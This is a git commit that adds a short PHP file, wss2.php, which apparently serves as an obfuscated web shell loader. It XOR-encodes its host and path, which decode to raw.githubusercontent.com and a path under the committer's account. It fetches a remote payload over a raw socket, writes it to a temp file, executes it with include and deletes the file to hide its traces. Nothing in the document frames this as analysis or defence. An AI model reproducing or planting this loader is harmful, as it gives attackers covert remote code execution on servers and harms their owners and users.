d678c17feec5c04c8f2f8294c0a45cc75adc655d
Setsuna Watanabe <105861519+Yucaerin@users.noreply.github.com>
2025-02-05 14:16:51 +0700

    Add files via upload

---
+++ wss2.php
@@ -0,0 +1,35 @@
+<?="";
+function xorEncryptDecrypt($data, $key) {
+    $output = '';
+    foreach (str_split($data) as $char) {
+        $output .= chr(ord($char) ^ ord($key));
+    }
+    return $output;
+}
+$_ = "!";
+	$url = xorEncryptDecrypt("S@VFHUITCTRDSBNOUDOUBNL", $_);
+	$path = xorEncryptDecrypt("xTB@DSHORHLQMDBLE@OEC@BJENNSSDGRID@ERL@HOVRQIQ", $_);
+	$fp = fsockopen("ssl://$url", 443, $errno, $errstr, 10);
+		if (!$fp) {
+			echo "Error: $errstr ($errno)";
+			exit;
+	}
+		$request = "GET $path HTTP/1.1\r\n";
+		$request .= "Host: $url\r\n";
+		$request .= "Connection: close\r\n\r\n";
+			fwrite($fp, $request);
+				$response = '';
+					while (!feof($fp)) {
+						$response .= fgets($fp, 1024);
+							}
+				fclose($fp);
+list(, $remotePayload) = explode("\r\n\r\n", $response, 2);
+	$parts = str_split($remotePayload, 4);
+	$obfuscatedPayload = implode('', $parts);
+	$tempFile = tempnam(sys_get_temp_dir(), 'php');
+		file_put_contents($tempFile, $obfuscatedPayload);
+	include $tempFile;
+unlink($tempFile);
+?>
+
+
